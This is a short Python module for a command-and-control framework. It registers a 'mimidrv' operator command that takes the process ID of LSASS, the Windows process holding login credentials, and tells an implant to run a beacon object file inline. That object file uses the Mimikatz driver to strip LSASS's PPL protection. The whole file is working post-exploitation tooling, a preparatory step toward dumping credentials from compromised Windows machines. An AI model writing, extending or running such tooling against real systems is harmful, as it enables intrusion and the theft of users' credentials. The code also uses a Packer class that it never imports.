from vaelix_host import Agent, RegisterCommand, RegisterModule
import re

def mimidrv( agentID, *params ):
    TaskID : str    = None
    agent  : Agent  = None
    packer = Packer()
    agent  = Agent( agentID )

    num_params = len(params)
    pid = ''

    if num_params < 1:
        agent.ConsoleWrite( agent.CONSOLE_ERROR, "Not enough parameters" )
        return True
    elif num_params == 1:
        pid = params[ 0 ]
    elif num_params > 1:
        agent.ConsoleWrite( agent.CONSOLE_ERROR, "Too many parameters" )
        return True

    try:
        pid = int( pid )
    except Exception as e:
        agent.ConsoleWrite( agent.CONSOLE_ERROR, "Invalid PID" )
        return True

    packer.adduint32(pid)

    TaskID = agent.ConsoleWrite( agent.CONSOLE_TASK, "Tasked agent to disable the PPL protection from LSASS" )

    agent.InlineExecute( TaskID, "go", "dist/mimidrv.x64.o", packer.getbuffer(), False )

    return TaskID

RegisterCommand( mimidrv, "", "mimidrv", "Disable PPL by interacting with the Mimidrv", 0, "<LSASS_PID>", "1337" )
